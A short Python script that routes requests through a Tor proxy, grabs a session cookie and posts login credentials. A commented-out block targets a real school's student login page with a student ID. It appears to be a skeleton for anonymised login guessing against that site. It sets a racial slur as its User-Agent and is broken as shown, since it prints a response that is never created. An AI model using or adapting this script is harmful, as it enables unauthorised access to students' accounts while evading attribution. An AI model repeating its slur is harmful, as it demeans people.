import json
import requests
import curlify

url = #TARGET#


#DO NOT CHANGE THIS PART
prox = {'http': "socks5://127.0.0.1:9050"}
rcookie = requests.get(url, proxies=prox)
cookies = {"PHPSESSID":rcookie.cookies['PHPSESSID']}
headers = {
    'User-Agent': 'Nigger',
}
data = {
    'input_unique_id': 'a',
    'input_pass': 'a',
    'btn_login': 'Submit',
}
#DO NOT CHANGE THIS PART


'''
data['input_unique_id'] = '2020001'
response = requests.post(
    'https://aos.ssc.edu.hk/aos/e-sportsday/student/index.php',
    cookies=cookies,
    headers=headers,
    data=data,
    verify=False,
    proxies=prox
)
'''
print("Response content:")
print(response.text)